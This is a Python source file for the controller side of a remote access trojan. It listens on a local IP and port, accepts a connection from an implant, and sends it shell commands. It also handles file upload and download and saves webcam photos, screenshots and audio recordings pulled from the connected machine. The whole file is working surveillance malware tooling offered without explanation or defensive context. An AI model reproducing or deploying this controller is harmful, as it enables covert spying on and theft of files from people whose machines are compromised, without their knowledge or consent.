#!/usr/bin/env python
import socket
import json
import base64
import time

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection from {address}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
        return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)
                elif command[0] == "webcam" and "[-] Error" not in result:
                    result = result + '=' * (-len(result) % 4)
                    try:
                        filename = f"webcam_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(result.encode()))
                        result = f"[+] Webcam image saved as {filename}"
                    except Exception as e:
                        result = f"[-] Error decoding webcam image: {str(e)}"
                elif command[0] == "screenshot" and "[-] Error" not in result:
                    result = result + '=' * (-len(result) % 4)
                    try:
                        filename = f"screenshot_{int(time.time())}.png"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(result.encode()))
                        result = f"[+] Screenshot saved as {filename}"
                    except Exception as e:
                        result = f"[-] Error decoding screenshot image: {str(e)}"
                elif command[0] == "record" and "[-] Error" not in result:
                    result = result + '=' * (-len(result) % 4)
                    try:
                        filename = f"recording_{int(time.time())}.wav"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(result.encode()))
                        result = f"[+] Audio recording saved as {filename}"
                    except Exception as e:
                        result = f"[-] Error decoding audio: {str(e)}"
            except Exception as e:
                result = f"[-] Error during command execution: {str(e)}"

            print(result)

my_listener = Listener("192.168.1.16", 8080)
my_listener.run()